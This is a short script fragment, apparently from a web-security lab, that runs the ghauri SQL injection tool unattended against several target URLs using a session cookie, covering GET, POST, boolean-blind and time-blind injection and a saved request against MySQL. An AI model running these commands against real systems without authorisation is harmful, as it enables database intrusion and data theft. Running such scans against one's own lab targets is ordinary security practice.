...
& $ghauri_path -u "$url_get_search" --cookie="$cookie_low" --batch

& $ghauri_path -u "$url_post_search" --data="title=it&action=search" --cookie="$cookie_low" --batch

& $ghauri_path -u "$url_blindB" --cookie="$cookie_low" --technique=B --level 2 --batch

& $ghauri_path -u "$url_blindT" --cookie="$cookie_low" --technique=T --level 2 --batch

& $ghauri_path -r "$request" --cookie="$cookie_low" --technique=ET --dbms mysql --batch